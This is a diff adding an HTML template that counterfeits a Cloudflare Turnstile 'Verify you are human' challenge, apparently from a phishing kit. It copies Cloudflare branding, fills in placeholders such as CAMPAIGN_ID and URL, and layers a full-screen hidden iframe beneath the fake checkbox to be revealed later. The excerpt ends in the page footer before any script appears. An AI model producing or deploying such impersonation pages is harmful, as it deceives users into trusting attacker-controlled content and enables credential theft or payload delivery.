@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+    <head>
+        <link rel='icon' href='FAVICON'>
+        <title>TITLE</title>
+        <base href="/CAMPAIGN_ID/">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+        <meta name="robots" content="noindex,nofollow">
+        <meta name="viewport" content="width=device-width,initial-scale=1">
+        <style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"}body{display:flex;flex-direction:column;height:100vh;min-height:100vh}.main-content{margin:8rem auto;padding-left:1.5rem;max-width:60rem}@media (width <= 720px){.main-content{margin-top:4rem}}.h2{line-height:2.25rem;font-size:1.5rem;font-weight:500}@media (width <= 720px){.h2{line-height:1.5rem;font-size:1.25rem}}#challenge-error-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");background-repeat:no-repeat;background-size:contain;padding-left:34px}@media (prefers-color-scheme: dark){body{background-color:#222;color:#d9d9d9}}</style>
+        <style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131;font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"}button{font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji"}body{display:flex;flex-direction:column;height:100vh;min-height:100vh}body.theme-dark{background-color:#222;color:#d9d9d9}body.theme-dark a{color:#fff}body.theme-dark a:hover{text-decoration:underline;color:#ee730a}body.theme-dark .lds-ring div{border-color:#999 rgba(0,0,0,0) rgba(0,0,0,0)}body.theme-dark .font-red{color:#b20f03}body.theme-dark .ctp-button{background-color:#4693ff;color:#1d1d1d}body.theme-dark #challenge-success-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4")}body.theme-dark #challenge-error-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+")}body.theme-light{background-color:#fff;color:#313131}body.theme-light a{color:#0051c3}body.theme-light a:hover{text-decoration:underline;color:#ee730a}body.theme-light .lds-ring div{border-color:#595959 rgba(0,0,0,0) rgba(0,0,0,0)}body.theme-light .font-red{color:#fc574a}body.theme-light .ctp-button{border-color:#003681;background-color:#003681;color:#fff}body.theme-light #challenge-success-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=")}body.theme-light #challenge-error-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+")}a{transition:color 150ms ease;background-color:rgba(0,0,0,0);text-decoration:none;color:#0051c3}a:hover{text-decoration:underline;color:#ee730a}.main-content{margin:8rem auto;padding-right:1.5rem;padding-left:1.5rem;width:100%;max-width:60rem}.main-content .loading-verifying{height:76.391px}.spacer{margin:2rem 0}.spacer-top{margin-top:4rem}.spacer-bottom{margin-bottom:2rem}.heading-favicon{margin-right:.5rem;width:2rem;height:2rem}@media (width <= 720px){.main-content{margin-top:4rem}.heading-favicon{width:1.5rem;height:1.5rem}}.main-wrapper{display:flex;flex:1;flex-direction:column;align-items:center}.font-red{color:#b20f03}.h1{line-height:3.75rem;font-size:2.5rem;font-weight:500}.h2{line-height:2.25rem;font-size:1.5rem;font-weight:500}.core-msg{line-height:2.25rem;font-size:1.5rem;font-weight:400}.body-text{line-height:1.25rem;font-size:1rem;font-weight:400}@media (width <= 720px){.h1{line-height:1.75rem;font-size:1.5rem}.h2{line-height:1.5rem;font-size:1.25rem}.core-msg{line-height:1.5rem;font-size:1rem}}#challenge-error-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+");background-repeat:no-repeat;background-size:contain;padding-left:34px}#challenge-success-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=");background-repeat:no-repeat;background-size:contain;padding-left:42px}.text-center{text-align:center}.ctp-button{transition-duration:200ms;transition-property:background-color,border-color,color;transition-timing-function:ease;margin:2rem 0;border:.063rem solid #0051c3;border-radius:.313rem;background-color:#0051c3;cursor:pointer;padding:.375rem 1rem;line-height:1.313rem;color:#fff;font-size:.875rem}.ctp-button:hover{border-color:#003681;background-color:#003681;cursor:pointer;color:#fff}.footer{margin:0 auto;padding-right:1.5rem;padding-left:1.5rem;width:100%;max-width:60rem;line-height:1.125rem;font-size:.75rem}.footer-inner{border-top:1px solid #d9d9d9;padding-top:1rem;padding-bottom:1rem}.clearfix::after{display:table;clear:both;content:""}.clearfix .column{float:left;padding-right:1.5rem;width:50%}.diagnostic-wrapper{margin-bottom:.5rem}.footer .ray-id{text-align:center}.footer .ray-id code{font-family:monaco,courier,monospace}.core-msg,.zone-name-title{overflow-wrap:break-word}@media (width <= 720px){.diagnostic-wrapper{display:flex;flex-wrap:wrap;justify-content:center}.clearfix::after{display:initial;clear:none;text-align:center;content:none}.column{padding-bottom:2rem}.clearfix .column{float:none;padding:0;width:auto;word-break:keep-all}.zone-name-title{margin-bottom:1rem}}.loading-verifying{height:76.391px}.lds-ring{display:inline-block;position:relative;width:1.875rem;height:1.875rem}.lds-ring div{box-sizing:border-box;display:block;position:absolute;border:.3rem solid #595959;border-radius:50%;border-color:#313131 rgba(0,0,0,0) rgba(0,0,0,0);width:1.875rem;height:1.875rem;animation:lds-ring 1.2s cubic-bezier(.5, 0, .5, 1) infinite}.lds-ring div:nth-child(1){animation-delay:-.45s}.lds-ring div:nth-child(2){animation-delay:-.3s}.lds-ring div:nth-child(3){animation-delay:-.15s}@keyframes lds-ring{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.rtl .heading-favicon{margin-right:0;margin-left:.5rem}.rtl #challenge-success-text{background-position:right;padding-right:42px;padding-left:0}.rtl #challenge-error-text{background-position:right;padding-right:34px;padding-left:0}.challenge-content .loading-verifying{height:76.391px}@media (prefers-color-scheme: dark){body{background-color:#222;color:#d9d9d9}body a{color:#fff}body a:hover{text-decoration:underline;color:#ee730a}body .lds-ring div{border-color:#999 rgba(0,0,0,0) rgba(0,0,0,0)}body .font-red{color:#b20f03}body .ctp-button{background-color:#4693ff;color:#1d1d1d}body #challenge-success-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4")}body #challenge-error-text{background-image:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+")}}</style>
+        <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        .main-content {
+            height: 100%;
+        }
+
+        .iframe-visible {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1; /* Livello basso */
+            /* Lo sfondo del body o di un contenitore deve essere bianco/scuro per non vedere l'iframe finché non lo vogliamo. */
+        }
+
+        /* Main Wrapper: Posizionato davanti all'iframe con sfondo solido */
+        .main-wrapper {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+        }
+
+        .cloudflare-challenge {
+            border-spacing: 0;
+            margin: 0;
+            padding: 0;
+            width: 300px;
+            height: 65px;
+            border: 1px solid #e0e0e0;
+            overflow: hidden;
+            font-family: -apple-system,system-ui,blinkmacsystemfont,"Segoe UI",roboto,oxygen,ubuntu,"Helvetica Neue",arial,sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            -webkit-font-smoothing: antialiased;
+            font-style: normal;
+        }
+
+        .challenge-content {
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 65px;
+            user-select: none;
+            padding: 0 0 0 16px;
+        }
+
+        .status-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .status {
+            display: none;
+            align-items: center;
+            gap: 16px;
+            white-space: nowrap;
+        }
+
+        .verification-text {
+            margin-left: 24px;
+        }
+
+        .branding {
+            display: inline-flex;
+            flex-direction: column;
+            margin: 0 16px 0 0;
+            text-align: right;
+        }
+
+        .terms {
+            display: inline-flex;
+            justify-content: flex-end;
+            line-height: 10px;
+            font-size: 8px;
+            font-weight: 400;
+            font-style: normal;
+            margin-top: 5px;
+        }
+
+        .link {
+            text-decoration: underline;
+            color: #bbb !important;
+        }
+
+        .link-spacer {
+            margin-right: 3px;
+            margin-left: 3px;
+        }
+
+        .icon-container {
+            position: relative;
+            height: 25px;
+            width: 25px;
+            min-width: 25px;
+        }
+
+        .custom-checkbox {
+            position: relative;
+            cursor: pointer;
+            font-size: 24px;
+            height: 35px;
+            align-items: center;
+        }
+
+        .custom-checkbox input {
+            opacity: 0;
+            position: absolute;
+        }
+
+        .custom-checkbox .checkmark {
+            position: absolute;
+            top: 4px;
+            left: 0;
+            height: 25px;
+            width: 25px;
+            background-color: transparent;
+            border-radius: 2px;
+            transition: border-color 0.2s;
+            border: 2px solid #999; /* Bordo grigio chiaro */
+        }
+
+        .checkbox-input:checked + .checkbox-checkmark::after {
+            content: "";
+            position: absolute;
+            display: block;
+            left: 6px;
+            top: 3px;
+            width: 5px;
+            height: 12px;
+            border-width: 0 3px 3px 0;
+            transform: rotate(45deg);
+        }
+
+        .cf-dot-spinner {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .cf-dot-spinner div {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            opacity: 0;
+            animation: cf-dots-8 1.2s infinite ease-in-out;
+        }
+
+        @keyframes cf-dots-8 {
+            0%, 100% { opacity: 0; transform: scale(0.6); }
+            50% { opacity: 1; transform: scale(1.0); }
+        }
+
+        .cf-dot-spinner div:nth-child(1) { top: 1px; left: 11px; }
+        .cf-dot-spinner div:nth-child(2) { top: 4px; left: 18px; animation-delay: -1.05s; }
+        .cf-dot-spinner div:nth-child(3) { top: 11px; left: 21px; animation-delay: -0.9s; }
+        .cf-dot-spinner div:nth-child(4) { top: 18px; left: 18px; animation-delay: -0.75s; }
+        .cf-dot-spinner div:nth-child(5) { top: 21px; left: 11px; animation-delay: -0.6s; }
+        .cf-dot-spinner div:nth-child(6) { top: 18px; left: 4px; animation-delay: -0.45s; }
+        .cf-dot-spinner div:nth-child(7) { top: 11px; left: 1px; animation-delay: -0.3s; }
+        .cf-dot-spinner div:nth-child(8) { top: 4px; left: 4px; animation-delay: -0.15s; }
+
+        .success-icon {
+            margin-right: 16px;
+            height: 30px;
+            width: 30px;
+            position: relative;
+        }
+
+        .success-icon:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 25px;
+            width: 25px;
+            border-radius: 50%;
+            box-sizing: border-box;
+            border: 0px !important;
+            background-color: #57b534;
+        }
+
+        .success-icon:after {
+            content: "";
+            position: absolute;
+            display: block;
+            left: 8px;
+            top: 4px;
+            width: 6px;
+            height: 12px;
+            border-width: 0 3px 3px 0;
+            transform: rotate(45deg);
+        }
+
+        /* ------------------------------------------------------------------- */
+        /* LIGHT MODE */
+        /* ------------------------------------------------------------------- */
+
+        .main-wrapper.light-mode {
+            background-color: #fff;
+            color: #313131;
+        }
+
+        .light-mode .cloudflare-challenge {
+            background-color: #fafafa;
+        }
+
+        .light-mode .checkbox-checkmark {
+            border: 2px solid #6d6d6d;
+        }
+        .light-mode .verification-text-base {
+            color: #313131;
+        }
+        .light-mode .checkbox-input:checked + .checkbox-checkmark::after {
+            border: solid #57b534;
+            border-width: 0 3px 3px 0;
+        }
+        .light-mode .icon-container:hover .checkbox-checkmark {
+            border-color: #797979;
+        }
+
+        .light-mode .cf-dot-spinner div {
+            background-color: #57b534;
+        }
+        .light-mode .verifying-text {
+            color: #313131;
+        }
+
+        .light-mode .success-icon:before {
+            border: 2px solid #57b534;
+        }
+        .light-mode .success-icon:after {
+            border: solid #fff;
+            border-width: 0 3px 3px 0;
+        }
+        .light-mode .success-text {
+            color: #313131;
+        }
+
+        .light-mode .terms {
+            color: #232323;
+        }
+
+        .light-mode .logo-text {
+            fill: #313131;
+        }
+
+        /* ------------------------------------------------------------------- */
+        /* DARK MODE */
+        /* ------------------------------------------------------------------- */
+
+        .main-wrapper.dark-mode {
+            background-color: #232323;
+            color: #fff;
+        }
+
+        .dark-mode .cloudflare-challenge {
+            background-color: #232323;
+        }
+
+        .dark-mode .logo-text {
+            fill: #fff;
+        }
+
+        .dark-mode .checkbox-checkmark {
+            border: 2px solid #dadada;
+        }
+        .dark-mode .verification-text-base {
+            color: #fff;
+        }
+
+        .dark-mode .checkbox-input:checked + .checkbox-checkmark::after {
+            border: solid #F6821F;
+            border-width: 0 3px 3px 0;
+        }
+        .dark-mode .icon-container:hover .checkbox-checkmark {
+            border-color: #57b534; /* Opzionale: bordo verde all'hover */
+        }
+
+        .dark-mode .cf-dot-spinner div {
+            background-color: #57b534;
+        }
+        .dark-mode .verifying-text {
+            color: #fff;
+        }
+
+        .dark-mode .success-icon:before {
+            border: 2px solid #fff;
+        }
+        .dark-mode .success-icon:after {
+            border: solid #fff;
+            border-width: 0 3px 3px 0;
+        }
+        .dark-mode .success-text {
+            color: #fff;
+        }
+
+        .dark-mode .terms {
+            color: #bbb;
+        }
+        </style>
+    </head>
+
+    <body>
+        <iframe class="iframe-visible" src="" width="100%" height="100%" frameborder="0" allowfullscreen style="visibility: hidden;"></iframe>
+        <div class="main-wrapper dark-mode" role="main">
+            <div class="main-content">
+                <h1 class="zone-name-title h1">
+                    <img src=FAVICON class="heading-favicon" alt="Icon for URL">URL
+                </h1>
+                <p id="iBSEj5" class="h2 spacer-bottom">Verify you are human by completing the action below.</p>
+                <div class="cloudflare-challenge">
+                    <div class="challenge-content">
+                        <div class="status-container">
+                            <div id="status-default" class="status" style="display: flex;">
+                                <label class="custom-checkbox" style="cursor: pointer;">
+                                    <input type="checkbox" id="cf-input" class="checkbox">
+                                    <span class="checkmark"></span>
+                                </label>
+                                <span class="verification-text">Verify you are human</span>
+                            </div>
+
+                            <div id="status-spinner" class="status" style="display: none;">
+                                <div class="icon-container">
+                                    <div class="cf-dot-spinner">
+                                        <div></div><div></div><div></div><div></div>
+                                        <div></div><div></div><div></div><div></div>
+                                    </div>
+                                </div>
+                                <span class="verifying-text">Verifying...</span>
+                            </div>
+
+                            <div id="status-success" class="status" style="display: none;">
+                                <!-- <svg id="success-i" viewBox="0 0 52 52" aria-hidden="true" style="display: block; visibility: hidden;">
+                                    <circle class="success-circle" cx="26" cy="26" r="25"></circle>
+                                    <path class="p1" d="m13,26l9.37,9l17.63,-18"></path>
+                                </svg> -->
+                                <div class="icon-container success-icon"></div>
+                                <span class="verifying-text">Success!</span>
+                            </div>
+                        </div>
+
+                        <div class="branding" style="width: 73px; height: 39px;">
+                            <a class="cf-link" target="_blank" href="https://www.cloudflare.com/products/turnstile/?utm_source=turnstile&utm_campaign=widget" rel="noopener noreferrer">
+                                <svg role="img" aria-label="Cloudflare" id="logo" viewBox="0 0 73 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z" fill="#F6821F"></path><path d="M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z" fill="#FBAD41"></path><path d="M8.11963 18.8904H9.75541V23.4254H12.6139V24.8798H8.11963V18.8904Z" class="logo-text"></path><path d="M14.3081 21.9023V21.8853C14.3081 20.1655 15.674 18.7704 17.4952 18.7704C19.3164 18.7704 20.6653 20.1482 20.6653 21.8681V21.8853C20.6653 23.6052 19.2991 24.9994 17.4785 24.9994C15.6578 24.9994 14.3081 23.6222 14.3081 21.9023ZM18.9958 21.9023V21.8853C18.9958 21.0222 18.3806 20.2679 17.4785 20.2679C16.5846 20.2679 15.9858 21.0038 15.9858 21.8681V21.8853C15.9858 22.7484 16.6013 23.5025 17.4952 23.5025C18.3973 23.5025 18.9958 22.7666 18.9958 21.9023Z" class="logo-text"></path><path d="M22.6674 22.253V18.8901H24.3284V22.2191C24.3284 23.0822 24.7584 23.4939 25.4159 23.4939C26.0733 23.4939 26.5034 23.1003 26.5034 22.2617V18.8901H28.1647V22.2093C28.1647 24.1432 27.0772 24.9899 25.3991 24.9899C23.7211 24.9899 22.6674 24.1268 22.6674 22.2522" class="logo-text"></path><path d="M30.668 18.8907H32.9445C35.0526 18.8907 36.275 20.1226 36.275 21.8508V21.8684C36.275 23.5963 35.0355 24.88 32.911 24.88H30.668V18.8907ZM32.97 23.4076C33.9483 23.4076 34.597 22.8609 34.597 21.8928V21.8759C34.597 20.9178 33.9483 20.3614 32.97 20.3614H32.3038V23.4082L32.97 23.4076Z" class="logo-text"></path><path d="M38.6525 18.8904H43.3738V20.3453H40.2883V21.3632H43.079V22.7407H40.2883V24.8798H38.6525V18.8904Z" class="logo-text"></path><path d="M45.65 18.8904H47.2858V23.4254H50.1443V24.8798H45.65V18.8904Z" class="logo-text"></path><path d="M54.4187 18.8475H55.9949L58.5079 24.8797H56.7541L56.3238 23.8101H54.047L53.6257 24.8797H51.9058L54.4187 18.8475ZM55.8518 22.5183L55.1941 20.8154L54.5278 22.5183H55.8518Z" class="logo-text"></path><path d="M60.6149 18.8901H63.4056C64.3083 18.8901 64.9317 19.13 65.328 19.5406C65.6742 19.883 65.8511 20.3462 65.8511 20.9357V20.9526C65.8511 21.8678 65.3691 22.4754 64.6369 22.7919L66.045 24.88H64.1558L62.9671 23.0658H62.2507V24.88H60.6149V18.8901ZM63.3299 21.7654C63.8864 21.7654 64.2071 21.4915 64.2071 21.0551V21.0381C64.2071 20.5674 63.8697 20.328 63.3211 20.328H62.2507V21.7665L63.3299 21.7654Z" class="logo-text"></path><path d="M68.2112 18.8904H72.9578V20.3024H69.8302V21.209H72.6632V22.5183H69.8302V23.4683H73V24.8798H68.2112V18.8904Z" class="logo-text"></path><path d="M4.53824 22.6043C4.30918 23.13 3.82723 23.5022 3.18681 23.5022C2.29265 23.5022 1.67746 22.7493 1.67746 21.8851V21.8678C1.67746 21.0047 2.27593 20.2676 3.1698 20.2676C3.84367 20.2676 4.35681 20.6882 4.5734 21.2605H6.29764C6.02151 19.8349 4.78716 18.7707 3.18681 18.7707C1.36533 18.7707 0 20.1666 0 21.8851V21.9021C0 23.6219 1.3486 25 3.1698 25C4.72762 25 5.94525 23.9764 6.26645 22.6046L4.53824 22.6043Z" class="logo-text"></path></svg>
+                            </a>
+                            <div class="terms">
+                                <a class="link" target="_blank" rel="noopener noreferrer" href="https://www.cloudflare.com/privacypolicy/">Privacy</a>
+                                <span class="link-spacer" style="color: #bbb;"> • </span>
